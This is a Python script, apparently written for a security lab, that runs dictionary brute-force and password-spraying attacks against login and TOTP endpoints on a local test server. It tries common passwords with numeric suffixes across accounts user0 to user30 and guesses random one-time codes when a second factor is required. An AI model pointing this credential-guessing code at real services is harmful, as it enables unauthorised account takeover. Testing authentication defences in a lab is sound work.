import requests
import json
import time
import secrets
import string


LOCAL_ADDRESS = 'http://localhost:8000'

def load_common_password():
    with open('dictionary_attack.txt') as file:
        dictionary_attack = file.readlines()
    file.close()
    return dictionary_attack


def post(username, password, session,endpoint, code):
    
    if endpoint == "login":
        # Post to the login endpoint
        url = f"{LOCAL_ADDRESS}/api/login"
        data = {
        'username': username,
        'password': password
    }
    elif endpoint == "totp":
        url = f"{LOCAL_ADDRESS}/api/login_totp"
        data = {
        'username': username,
        'password': password,
        'code': code
    }

    try:
        response = session.post(url, json=data)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

    print(f"Status Code: {response.status_code}")
    # Only attempt to parse JSON if the response reports JSON
    content_type = response.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            print(response.json(), username, password, code)
        except ValueError:
            print("Response said JSON but could not parse it")
    else:
        print(response.text, username, password, code)
    return response.status_code


def start_brute_force():
    #need to choose randomly from each category?
    #for i in range(11,31):
        try:
            if brute_force(f'user11'):
                print("hacked!")
                #break
        except:
            print('error in sending info to the server')


def brute_force(username):
    common_passwords = load_common_password()
    start_time = time.time()  
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    attempt_count = 0
    session = requests.Session()
    endpoint = "login"
    code = None

    for password in common_passwords:
        
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break
        
        #check password without suffix
        password = password[:-1]
        print(password, username)
        answer = post(username, password, session,endpoint, code)
        attempt_count += 1
        if answer == 200:
            return 1 
        if answer == 403:
            endpoint = "totp"
            code = generate_code()


        if not password.isdigit():
            #check password with suffix
            for length in [1, 2]:
                for i in range(10**length):
                    suffix = f"{i:0{length}}"
                    current_password = password + suffix
                    answer = post(username, current_password, session,endpoint, code)
                    attempt_count += 1 
                    if answer == 200:
                        print(current_password, username, code)
                        return 1
                    if answer == 403:
                        endpoint = "totp"
                        code = generate_code()   
    return 0


def start_password_spraying():
    #repeated code need to fix
    start_time = time.time()  
    attempt_count = 0
    session = requests.Session()
    common_passwords = load_common_password()

    for password in common_passwords:
        password = password[:-1]
        try:
            result = password_sparying(password, session, start_time, attempt_count)
            if result[0]:
                print("hacked!")
                break
            else:
                attempt_count = result[1]
            
            if not password.isdigit():
            #check password with suffix
                for length in [1, 2]:
                    for i in range(10**length):
                        suffix = f"{i:0{length}}"
                        current_password = password + suffix
                        result = password_sparying(current_password, session, start_time, attempt_count)
                        if result[0]:
                            break
                        else:
                            attempt_count = result[1]
                            
        except:
            print('error in sending info to the server')
            break


def password_sparying(password, session, start_time,attempt_count):
    max_attempts = 1000000    
    max_seconds = 2 * 3600   # 2 hours in secs
    endpoint = "login"
    code = None

    for i in range(31):
        #check attempts limit
        if attempt_count >= max_attempts:
            print("Reached maximum attempts limit.")
            break
        
        #check time limit
        elapsed_time = time.time() - start_time
        if elapsed_time >= max_seconds:
            print("Reached time limit (2 hours).")
            break

        answer = post(f'user{i}', password, session,endpoint,code)

        attempt_count += 1 

        if answer == 200:
            return (1, attempt_count)
        elif answer == 403:
            endpoint = "totp"
            code = generate_code()

    return (0, attempt_count)


def generate_code():
    length = 6
    allowed_characters = string.ascii_letters + string.digits
    otp = ''.join(secrets.choice(allowed_characters) for _ in range(length))
    return otp
    
    



def main():
    start_password_spraying()
    #start_brute_force()


if __name__ == '__main__':
    main()